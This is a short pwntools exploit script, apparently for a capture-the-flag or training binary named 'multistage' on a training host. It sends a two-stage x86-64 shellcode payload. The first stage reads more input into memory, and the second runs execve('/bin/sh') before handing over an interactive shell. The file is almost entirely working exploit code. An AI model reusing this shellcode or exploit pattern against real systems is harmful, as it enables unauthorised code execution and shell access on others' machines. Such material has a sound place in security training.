from pwn import *

'''
SHELLCODE 1

mov rax, rbx
mov rdi, rbx
mov esi, 0x404082
mov edx, 0x100
syscall
'''

'''
SHELLCODE 2

mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rbx, rbx
push rbx
mov rsi, rsp
mov rdx, rsp
mov rax, 0x3b
syscall
'''

ELF('./multistage')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2003)
else:
    r = process('./multistage')
    gdb.attach(r, '''
        #b *0x004011bb
    ''')

shellcode_1 = b"\x48\x89\xD8\x48\x89\xDF\xBE\x82\x40\x40\x00\xBA\x00\x01\x00\x00\x0F\x05"
shellcode_2 = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

input('press a key..')
r.sendline(shellcode_1)
r.recvline()
r.sendline(shellcode_2)
r.interactive()